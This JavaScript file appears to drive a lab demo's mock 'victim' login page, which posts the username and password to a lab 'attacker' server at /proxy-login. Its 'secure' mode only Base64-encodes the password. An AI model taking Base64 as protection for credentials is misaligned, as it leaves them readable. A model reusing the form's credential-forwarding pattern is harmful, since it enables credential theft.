// victim.js - Logic for the Victim's Login Page

let currentMode = 'insecure';

// Use the current domain if running on a server, otherwise fallback to the hardcoded IP or localhost
const CURRENT_HOST = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' ? 'localhost' : '10.0.9.144';
const ATTACKER_URL = `http://${CURRENT_HOST}:4000`;

console.log(`[VICTIM] Target URL: ${ATTACKER_URL}`);

// 1. MODE SELECTION LOGIC
const insecureBtn = document.getElementById('insecure-mode');
const secureBtn = document.getElementById('secure-mode');
const modeDesc = document.getElementById('mode-desc');

if (insecureBtn && secureBtn) {
    insecureBtn.addEventListener('click', () => {
        currentMode = 'insecure';
        insecureBtn.classList.add('active');
        secureBtn.classList.remove('active');
        modeDesc.innerHTML = 'Current Mode: <strong>Insecure</strong>. Data is sent in raw plaintext.';
        updatePacketView();
    });

    secureBtn.addEventListener('click', () => {
        currentMode = 'secure';
        secureBtn.classList.add('active');
        insecureBtn.classList.remove('active');
        modeDesc.innerHTML = 'Current Mode: <strong>Secure</strong>. Password is Base64 encoded before transmission.';
        updatePacketView();
    });
}

// 2. REAL-TIME PACKET SIMULATION VIEW
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const packetContent = document.getElementById('packet-content');

function updatePacketView() {
    if (!usernameInput || !passwordInput || !packetContent) return;
    
    const user = usernameInput.value || '...';
    let pass = passwordInput.value || '...';

    // Simulation of Base64 encoding for UI view
    if (currentMode === 'secure' && passwordInput.value) {
        try {
            pass = btoa(pass); // Base64 Encoding
        } catch (e) {
            console.error('[VICTIM] Base64 encoding failed:', e);
        }
    }

    packetContent.textContent = `POST /login username=${user}&password=${pass}`;
}

if (usernameInput) usernameInput.addEventListener('input', updatePacketView);
if (passwordInput) passwordInput.addEventListener('input', updatePacketView);

// 3. LOGIN FORM SUBMISSION
const loginForm = document.getElementById('login-form');

if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = usernameInput.value;
        let password = passwordInput.value;

        console.log(`[VICTIM] Submitting... User: ${username}, Mode: ${currentMode}`);

        // SECURE MODE: ENCODE BEFORE SENDING
        if (currentMode === 'secure') {
            try {
                password = btoa(password); 
            } catch (e) {
                console.error('[VICTIM] Base64 encoding failed for submission');
            }
        }

        try {
            const response = await fetch(`${ATTACKER_URL}/proxy-login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username,
                    password,
                    mode: currentMode
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            console.log('[VICTIM] Success:', data);
            alert(`Server Response: ${data.message}`);
        } catch (err) {
            console.error('[VICTIM] Submission Error:', err);
            alert(`Submission Failed!\n\nTarget: ${ATTACKER_URL}\n\nError: ${err.message}\n\nMake sure 'attacker_server.js' is running and the IP/port is accessible.`);
        }
    });
}

console.log('[VICTIM] Script initialized.');
